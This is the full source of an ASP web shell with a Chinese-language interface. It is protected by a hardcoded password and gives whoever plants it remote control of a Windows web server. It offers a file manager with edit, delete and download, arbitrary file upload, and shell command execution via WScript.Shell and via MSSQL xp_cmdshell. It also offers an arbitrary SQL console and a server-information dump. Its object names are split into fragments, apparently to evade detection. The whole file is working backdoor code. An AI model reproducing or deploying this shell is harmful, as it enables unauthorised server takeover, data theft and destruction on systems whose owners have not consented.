<%
On Error Resume Next
Pass="gogocjj":URL=Request.ServerVariables("URL"):IP=Request.ServerVariables("LOCAL_ADDR"):Act=Request("Act"):RootPath=Server.MapPath("."):WWWRoot=Server.MapPath("/"):FolderPath=Request("FolderPath"):FName=Request("FName"):BackUrl="<meta http-equiv='refresh' content='2;URL=?Act=ShowFile'>":If Session("aweige")<>Pass Then:If Request.Form("LPass")<>"" Then:If Request.Form("LPass")=Pass Then:Session("aweige")=Pass:Response.Redirect URL:Else:response.end:End If:Else:Response.Write"<form Act='"&URL&"' method='post'><input name='LPass'> <input type='submit' value='LoGin'></form>":End If:Response.End:End If

sub ShowErr()
  If Err Then:Response.Write"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a>":Err.Clear:Response.Flush:End If:end sub

Dim ObT(6,2)
ObT(0,0) = "Sc"&Df&"rip"&Df&"ting"&Df&".F"&Df&"ileS"&Df&"yste"&Df&"mObj"&Df&"ect":ObT(1,0) = "w"&Df&"sc"&Df&"ri"&Df&"pt.s"&Df&"he"&Df&"ll":ObT(2,0) = "ADOX.Catalog":ObT(3,0) = "Scrip"&Df&"ting"&Df&".D"&Df&"icti"&Df&"onary":ObT(4,0) = "Adodb.connection":ObT(5,0) = "Ado"&Df&"db"&Df&".S"&Df&"tre"&Df&"am"

For i=0 To 5
Set T=Server.CreateObject(ObT(i,0))
If -2147221005 <> Err Then
IsObj=True
Else
IsObj=false
Err.Clear
End If
Set T=Nothing
ObT(i,1)=IsObj
Next

Function RePath(S):RePath=Replace(S,"\","\\"):End Function:Function RRePath(S):RRePath=Replace(S,"\\","\"):End Function:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=RootPath:Session("FolderPath")=FolderPath:End if
Function Ico(ta):Ico = "&nbsp;<font face='wingdings' size='5'>"&ta&"</font>":End Function::Function MainForm():S="<form name=""hideform"" method=""post"" Act="""&URL&""" target=""FileFrame""><input type=""hidden"" name=""Act""><input type=""hidden"" name=""FName""></form><table class=tr width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0'><tr><td height='30' colspan='2'><table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'><form name='addrform' method='post' Act='"&URL&"' target='_parent'><tr><td width='60' align='center'>地址栏：</td><td><input name='FolderPath' style='width:95%' value='"&Session("FolderPath")&"'> <input name='Submit' type='submit' value='转到'></td></tr></form></table></td></tr><tr><td width='160'><iframe name='Left' src='?Act=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td><td><iframe name='FileFrame' src='?Act=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe></td></tr></table>":Response.Write S:End Function:Function MainMenu():S="<body class=tr><table width='100%' border='0' cellspacing='0' cellpadding='0'><tr><td height='5'></td></tr>"&"<tr><td>&nbsp;"&Ico("&#58")&"我的电脑</td></tr>":on error resume next:If Not ObT(0,1) Then:S=S&"<tr><td height='20'></td></tr>":Else:Set ABC=New LBF:S=S&ABC.ShowDriver():Set ABC=Nothing:S=S&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"& Ico("&#52")&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>WEB根目录</a></td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"& Ico("&#52")&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>程序目录</a></td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"& Ico("1")&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>新建目录</a></td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"&Ico("2")&"<a href='?Act=EditFile' target='FileFrame'>新建文本</a></td></tr>":End If:Response.Write S:S="":S=S&"<tr><td>&nbsp;"&Ico("&#54")&"<a href='?Act=UpFile' target='FileFrame'>文件上传</a></td></tr>:<tr><td>&nbsp;"&Ico("&#56")&"数据库操作</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"&Ico("4")&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>建立MDB文件</a></td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"&Ico("4")&"<a href='?Act=DbManager' target='FileFrame'>数据库操作</a></td></tr><tr><td>&nbsp;"&Ico("&#55")&"命令行</td></tr><tr><td>&nbsp;&nbsp;&nbsp;"&Ico("&#61")&"<a href='?Act=CmdShell' target='FileFrame'>一般CMD命令</a></td></tr><tr><td>&nbsp;&nbsp;&nbsp;"&Ico("&#61")&"<a href='?Act=MMD' target='FileFrame'>SQL CMD命令</a></td></tr><tr><td>&nbsp;"&Ico("f")&"<a href='?Act=ServerInfo' target='FileFrame'>服务器信息</a></td></tr><tr><td>&nbsp;"&Ico("f")&"<a href='?Act=Logout' target='_top'>退出登录</a></td></tr></table></body>":Response.Write S : S="":End Function:Function ServerInfo():S=S&"<table width=100% class=am><tr>服务器上安装的服务</tr>":on error resume next:set SV = GetObject("WinNT://."):for each obj in SV:if lcase(mid(obj.path,4,3))="win" then:S=S&"<tr><td> "&obj.Name&"</td><td> "&obj.DisplayName &"</td></tr><tr><td></td><td><font color=green>"&obj.path&"</td></tr>":else:S=S&"<tr><td> "&obj.Name&"</td><td> "&obj.DisplayName &"</td></tr><tr><td></td><td><font color=red>"&obj.path&"</td></tr>":end if:next:S=S&"</table><tr>服务器变量</tr><hr><table><td class=am>":for each name in request.servervariables:S=S&name&"<br>"&request.servervariables(name)&"<HR>":next:S=S&"</td></table>":Response.Write S : S="":End Function:Function DownFile(Path):Response.Clear:Set OSM = CreateObject(ObT(5,0)):OSM.Open:OSM.Type = 1:OSM.LoadFromFile Path:Response.AddHeader "Content-Disposition", "attachment; filename=" & Path:Response.Charset = "UTF-8":Response.ContentType = "application/octet-stream":Response.BinaryWrite OSM.Read:Response.Flush:OSM.Close:Set OSM = Nothing:End Function
Function HTMLEncode(S):if not isnull(S) then:S = replace(S, ">", "&gt;"):S = replace(S, "<", "&lt;"):S = replace(S, CHR(39), "&#39;"):S = replace(S, CHR(34), "&quot;"):HTMLEncode = S:end if:End Function
Function UpFile():If Request("Act2")="Post" Then:Set U=new UPC : Set F=U.UA("LocalFile"):UName=U.form("ToPath"):If UName="" Or F.FileSize=0 then:SI="请输入上传的完全路径后选择一个文件上传!":Else:F.SaveAs UName:If Err.number=0 Then:SI="文件"&UName&"上传成功！":End if:End If:Set F=nothing:Set U=nothing:SI=SI&BackUrl:Response.Write SI:ShowErr():Response.End:End If:SI="<table align='center'><form name='UpForm' method='post' action='"&URL&"?Act=UpFile&Act2=Post' enctype='multipart/form-data'><tr><td>上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' size='40'>&nbsp;<input name='LocalFile' type='file'  size='25'><input type='submit' name='Submit' value='上传'></td></tr></form></table>":Response.Write SI:End Function
Function CmdShell()
  If Request("SP")<>"" Then:ShellPath = Request("SP"):Else:ShellPath = "cmd.exe":End If
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  S="<form method='post'><textarea readonly  Style='width:100%;height:500;' class='cmd'>"
  If Request.Form("cmd")<>"" Then S=S&CreateObject(ObT(1,0)).exec(ShellPath&" /c "&DefCmd).stdout.readall
  S=S&"</textarea> 路 径：<input name='SP' size=55> 命 令：<input name='cmd' size=55><input type='submit' value='执行'></form>Rar命令行压缩示例：c:\progra~1\winrar\rar.exe a d:\web\web1.rar d:\web\web1"
  Response.Write S
End Function
FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD命令<input type=text name=MMD size=35 ><input type=text name=U value=mssql用户名><input type=text name=P value=mssql密码><input type=submit value=执行></form></tr></table>":response.write SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=Server.CreateObject("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cmdshell '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:Response.Write request.form("MMD") & "<br>"& strResult:end FuncTion
Function CreateMdb(Path) 
   Set C = CreateObject(ObT(2,0)):C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path):Set C = Nothing:If Err.number=0 Then
     S = S & Path & "建立成功!"
   End If:S=S&BackUrl:Response.Write S:End function 
Function DbManager():SqlStr=Trim(Request.Form("SqlStr")):DbStr=Request.Form("DbStr"):S=S&"<table width='100%'  border='0' cellspacing='0' cellpadding='0'><form name='DbForm' method='post' Act=''><tr><td width='100' height='27'> &nbsp;数据库连接串:</td>":S=S&"<td><input name='DbStr' style='width:100%' value="""&DbStr&"""></td><td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option><option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option><option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option><option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option><option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option><option value=12>完全显示</option></select></td></tr><input name='Act' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'><tr><td height='30'>&nbsp;SQL操作命令:</td><td><input name='SqlStr' style='width:100%' value="""&SqlStr&"""></td><td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td></tr></form></table><span id='abc'></span>":Response.Write S:S=""
 If Len(DbStr)>40 Then  
 Set Conn=CreateObject(ObT(4,0)):Conn.Open DbStr:Set Rs=Conn.OpenSchema(20):S=S&"<table><tr height='25' Bgcolor='#D2EAFF'><td>表<br>名</td>"
 Rs.MoveFirst 
 Do While Not Rs.Eof
 If Rs("TABLE_TYPE")="TABLE" then
 TName=Rs("TABLE_NAME")
 S=S&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br><a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
 End If 
 Rs.MoveNext 
 Loop 
 Set Rs=Nothing
 S=S&"</tr></table>"
 Response.Write S:S=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
   S=S&"执行语句："&SqlStr
   Set Rs=CreateObject("Adodb.Recordset")
   Rs.open SqlStr,Conn,1,1
   FN=Rs.Fields.Count
   RC=Rs.RecordCount
   Rs.PageSize=8
   Count=Rs.PageSize
   PN=Rs.PageCount
   Page=request("Page")
   If Page<>"" Then Page=Clng(Page)
   If Page="" Or Page=0 Then Page=1
   If Page>PN Then Page=PN
   If Page>1 Then Rs.absolutepage=Page
   S=S&"<table><tr height=25 class=tr><td></td>"	  
   For n=0 to FN-1
   Set Fld=Rs.Fields.Item(n)
   S=S&"<td align='center'>"&Fld.Name&"</td>"
   Set Fld=nothing
   Next
   S=S&"</tr>"
   Do While Not(Rs.Eof or Rs.Bof) And Count>0
   Count=Count-1
  Bgcolor="#F0FCFF"
  S=S&"<tr><td class=tr><font face='wingdings'>x</font></td>"  
  For i=0 To FN-1
  Bgcolor="#F0FCFF"
  If RC=1 Then
   ColInfo=HTMLEncode(Rs(i))
    Else
     ColInfo=HTMLEncode(Left(Rs(i),50))
      End If
    S=S&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
  Next
 S=S&"</tr>"
Rs.MoveNext
Loop	
Response.Write S:S=""
	SqlStr=HtmlEnCode(SqlStr)
S=S&"<tr><td colspan="&FN+1&" align=center>记录数："&RC&"&nbsp;页码："&Page&"/"&PN
 If PN>1 Then
 S=S&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a>&nbsp;"
 If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
 For i=Sp To Sp+8
If i>PN Then Exit For
If i=Page Then
S=S&i&"&nbsp;"
Else
S=S&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
End If
Next:S=S&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
End If:S=S&"<hr color='#F0FCFF'></td></tr></table>":Rs.Close:Set Rs=Nothing:Response.Write S:S=""
Else:Conn.Execute(SqlStr):S=S&"成功执行SQL语句："&SqlStr
End If:Response.Write S:S=""
End If:Conn.Close:Set Conn=Nothing
 End If:End Function
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=IP%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  input,select{font-size: 12px;background-color:#FFFFFF;}
  .tr {background-color:#D2EAFF;}
  .cmd {background-color:#000000;color:#FFFFFF}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%If Act="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
  a {color: black;text-decoration: none;}
  .am {background-color:#F0FCFF}
-->
</style>
<script language="javascript">
<!--
  function yesok(){
    if (confirm("确认要执行此操作吗？"))
		return true;
	else
		return false;
    }
  function ShowFolder(Folder){
    top.addrform.FolderPath.value = Folder;
    top.addrform.submit();
    }
  function FullForm(FName,FAction){
    top.hideform.FName.value = FName;
	if(FAction=="CopyFile"){
	    DName = prompt("请输入复制到目标文件全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="MoveFile"){
	    DName = prompt("请输入移动到目标文件全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="CopyFolder"){
	    DName = prompt("请输入移动到目标文件夹全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="MoveFolder"){
	    DName = prompt("请输入移动到目标文件夹全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="NewFolder"){
	    DName = prompt("请输入要新建的文件夹全名称",FName);
	    top.hideform.FName.value = DName;
	}else if(FAction=="CreateMdb"){
	    DName = prompt("请输入要新建的Mdb文件全名称,注意不能同名！",FName);
        top.hideform.FName.value = DName;
	}else{
	    DName = "Other"; 
	}
	if(DName!=null){
      top.hideform.Act.value = FAction;
      top.hideform.submit();
	}else{
      top.hideform.FName.value = "";
	}
  }
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("请先连接数据库");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session("FolderPath"))%>\\db.mdb";
	Str[1] = "Driver={Sql Server};Server=<%=IP%>,1433;Database=DbName;Uid=sa;Pwd=";
	Str[2] = "Driver={MySql};Server=<%=IP%>;Port=3306;Database=DbName;Uid=root;Pwd=";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'aweige\',\'pass\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=1";
	Str[7] = "UPDATE [TableName] SET USER=\'aweige\' WHERE ID=1";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	  abc.innerHTML="<center>请确认己连接数据库再输入SQL操作命令语句。</center>";
	}else if(i==12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  } 
  function FullSqlStr(str,pg){
   if(DbForm.DbStr.value.length<5){
  alert("请检查数据库连接串是否正确!")
  return false;
}
   if(str.length<10){
  alert("请检查SQL语句是否正确!")
  return false;
}
DbForm.SqlStr.value = str ;
DbForm.Page.value = pg;
abc.innerHTML="";
DbForm.submit();
return true;
  }
-->
</script>
</head><body>
<%
Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F):F=lcase(F):If D1.exists(F) then:Form=D1(F):else:Form="":end if:End Function
  Public Function UA(F):F=lcase(F):If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if:End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject(ObT(3,0)):if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject(ObT(5,0)):T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes):T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa):set D2=CreateObject(ObT(3,0)):vbCrlf = chrB(13) & chrB(10):set T2 = CreateObject(ObT(5,0)):TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1):TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(5,0))
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class

Class LBF
  Dim CF
  Private Sub Class_Initialize
    SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
    Set CF=Nothing
  End Sub
  function Tran(drv):select case drv:case 0:Tran=Ico("&#61")&"怪盘":case 1:Tran=Ico("&#60")&"软盘":case 2:Tran=Ico("&#59")&"本地硬盘":case 3:Tran=Ico("&#82")&"网络盘":case 4:Tran=Ico("&#62")&"光盘":case 5:Tran="RAM":end select:end function
  Function ShowDriver():For Each D in CF.Drives:S=S&"<tr><td>&nbsp;&nbsp;":S=S&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>"&Tran(D.DriveType)& D.DriveLetter&"</a></td></tr>":Next:ShowDriver=S:End Function
  Function FileIco(FName):FileIco="<font face='wingdings' size='5'>2</font> ":End Function
  Function ShowFile(Path):Set FOLD=CF.GetFolder(Path):i=0:S="<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#D2EAFF'><tr>":For Each F in FOLD.subfolders:S=S&"<td>"&Ico("0")&" <a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>"&F.Name&"</a> | <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()'>del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()'>copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()'>move</a>":i=i+1:If i mod 3 = 0 then S=S&"</tr><tr>"
  Next:S=S&"</tr><tr><td height=5></td></tr></table>":Response.Write S : S="":For Each L in Fold.files:S="<table width='100%'  border='0' cellspacing='1' cellpadding='0'><tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className='am'"" class=am><td height='20' width='180'>"&FileIco(L.Name)&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title=""点击下载"&chr(13)&"文件名: "&L.Name&chr(13)&"大小："&clng(L.size/1024)&"K"&chr(13)&"类型: "&L.type&chr(13)&"属性: "&L.Attributes&chr(13)&"时间："&L.DateLastModified&""">"&L.Name&"</a></td><td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")'>edit</a></td><td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()'>del</a></td><td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")'>copy</a></td><td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")'>move</a></td></tr></table>":Response.Write S : S=""
  Next:Set FOLD=Nothing:End function
  
  Function DelFile(Path):If CF.FileExists(Path) Then:CF.DeleteFile Path:S="文件 "&Path&" 删除成功！"&BackUrl:Response.Write S:End If:End Function
  Function EditFile(Path):If Request("Act2")="Post" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form("content"):T.close:Set T=nothing:SI="文件保存成功！":SI=SI&BackUrl:Response.Write SI:Response.End:End If:If Path<>"" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.readall):T.close:Set T=Nothing:Else:Path=Session("FolderPath")&"\newfile.asp":Txt="新建文件":End If:SI="<table width='100%' height='100%'><tr><td valign='top' align='center'>":SI=SI&"<Form action='"&URL&"?Act2=Post' method='post' name='EditForm'>":SI=SI&"<input name='Act' value='EditFile' Type='hidden'>":SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'>":SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>":SI=SI&"<input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>":SI=SI&"</td></tr></table></body></html>":Response.Write SI:End Function  
  Function CopyFile(Path):Path = Split(Path,"||||"):If CF.FileExists(Path(0)) and Path(1)<>"" Then:CF.CopyFile Path(0),Path(1):S="文件"&Path(0)&"复制成功！"&BackUrl:Response.Write S:End If:End Function
  Function MoveFile(Path):Path = Split(Path,"||||"):If CF.FileExists(Path(0)) and Path(1)<>"" Then:CF.MoveFile Path(0),Path(1):S="文件"&Path(0)&"移动成功！"&BackUrl: Response.Write S:End If:End Function
  Function DelFolder(Path):If CF.FolderExists(Path) Then:CF.DeleteFolder Path:S="目录"&Path&"删除成功！"&BackUrl:Response.Write S:End If:End Function:
  Function CopyFolder(Path):Path = Split(Path,"||||"):If CF.FolderExists(Path(0)) and Path(1)<>"" Then:CF.CopyFolder Path(0),Path(1):S="目录"&Path(0)&"复制成功！"&BackUrl:Response.Write S:End If:End Function
  Function MoveFolder(Path):Path = Split(Path,"||||"):If CF.FolderExists(Path(0)) and Path(1)<>"" Then:CF.MoveFolder Path(0),Path(1):S="目录"&Path(0)&"移动成功！"&BackUrl:Response.Write S:End If:End Function
  Function NewFolder(Path):If Not CF.FolderExists(Path) and Path<>"" Then:CF.CreateFolder Path:S="目录"&Path&"新建成功！"&BackUrl:Response.Write S:End If:End Function
End Class
Select Case Act:Case "MainMenu":MainMenu():Case "ShowFile":Set ABC=New LBF:ABC.ShowFile(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "UpFile":UpFile():Case "Logout":Session.Contents.Remove("aweige"):Response.Redirect URL:Case "CmdShell":CmdShell():Case "MMD":MMD():Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "DbManager":DbManager():Case "ServerInfo":ServerInfo():Case Else MainForm():End Select:ShowErr()
%>
<%'EndMark
Response.write "<BR><DIV align=center>黑白配论坛 <BR>"&_
"http://bbs.iceyu.cn/Default.asp</DIV>"
%>
</body></html>